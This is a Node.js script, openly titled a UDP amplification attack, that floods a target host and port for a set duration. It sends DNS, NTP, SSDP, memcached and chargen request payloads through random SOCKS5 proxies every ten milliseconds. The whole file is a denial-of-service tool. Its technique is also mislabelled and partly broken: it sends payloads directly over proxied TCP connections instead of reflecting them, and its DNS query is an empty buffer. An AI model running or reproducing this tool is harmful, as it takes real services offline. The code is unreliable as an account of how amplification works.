const dgram = require('dgram');
const crypto = require('crypto');
const SocksClient = require('socks').SocksClient;
const fs = require('fs');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

// Load SOCKS5 proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync('socks5.txt', 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.log('Error loading proxies, fetching from remote...');
    // Will be fetched by bootup function in index.js
}

function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Generate DNS query payload
function generateDNSQuery() {
    const payload = Buffer.alloc(512);
    // DNS Header
    payload.writeUInt16BE(0x1234, 0); // ID
    payload.writeUInt16BE(0x0100, 2); // Flags
    payload.writeUInt16BE(0x0001, 4); // Questions
    payload.writeUInt16BE(0x0000, 6); // Answers
    payload.writeUInt16BE(0x0000, 8); // Authority
    payload.writeUInt16BE(0x0000, 10); // Additional
    return payload;
}

// Generate NTP request payload
function generateNTPRequest() {
    const payload = Buffer.alloc(48);
    payload[0] = 0x1b; // NTP version 3, mode 3 (client)
    return payload;
}

// Generate SSDP discovery payload
function generateSSDPRequest() {
    return Buffer.from(
        'M-SEARCH * HTTP/1.1\r\n' +
        'HOST: 239.255.255.250:1900\r\n' +
        'MAN: "ssdp:discover"\r\n' +
        'MX: 1\r\n' +
        'ST: ssdp:all\r\n\r\n'
    );
}

// Different amplification techniques
const amplificationPayloads = {
    dns: generateDNSQuery(),
    ntp: generateNTPRequest(),
    ssdp: generateSSDPRequest(),
    memcached: Buffer.from('stats\r\n'),
    chargen: Buffer.from('012345678901234567890123456789')
};

async function sendThroughProxy(payload, proxyString) {
    try {
        const [proxyHost, proxyPort] = proxyString.split(':');
        
        const options = {
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort),
                type: 5 // SOCKS5
            },
            command: 'connect',
            destination: {
                host: target,
                port: parseInt(port)
            }
        };

        const info = await SocksClient.createConnection(options);
        const socket = info.socket;

        socket.write(payload);
        
        setTimeout(() => {
            socket.destroy();
        }, 2000);

    } catch (err) {
        // Proxy failed, skip it
    }
}

// Amplification attack methods with proxy
async function dnsAmplification() {
    const proxy = getRandomProxy();
    for(let i = 0; i < 30; i++) {
        await sendThroughProxy(amplificationPayloads.dns, proxy);
    }
}

async function ntpAmplification() {
    const proxy = getRandomProxy();
    for(let i = 0; i < 25; i++) {
        await sendThroughProxy(amplificationPayloads.ntp, proxy);
    }
}

async function ssdpAmplification() {
    const proxy = getRandomProxy();
    for(let i = 0; i < 35; i++) {
        await sendThroughProxy(amplificationPayloads.ssdp, proxy);
    }
}

async function memcachedAmplification() {
    const proxy = getRandomProxy();
    for(let i = 0; i < 20; i++) {
        await sendThroughProxy(amplificationPayloads.memcached, proxy);
    }
}

async function chargenAmplification() {
    const proxy = getRandomProxy();
    for(let i = 0; i < 40; i++) {
        await sendThroughProxy(amplificationPayloads.chargen, proxy);
    }
}

// Main attack loop
const methods = [
    dnsAmplification,
    ntpAmplification,
    ssdpAmplification,
    memcachedAmplification,
    chargenAmplification
];

setInterval(async () => {
    const randomMethod = methods[Math.floor(Math.random() * methods.length)];
    await randomMethod();
}, 10);

console.clear();
console.log(`
╔══════════════════════════════════════════╗
║          UDP Amplification Attack        ║
║------------------------------------------║
║ Target: ${target}
║ Port: ${port}
║ Duration: ${duration} seconds
║ Status: Running with SOCKS5 Proxies...
╚══════════════════════════════════════════╝
`);

setTimeout(() => {
    console.log('Attack completed.');
    process.exit(0);
}, duration * 1000); 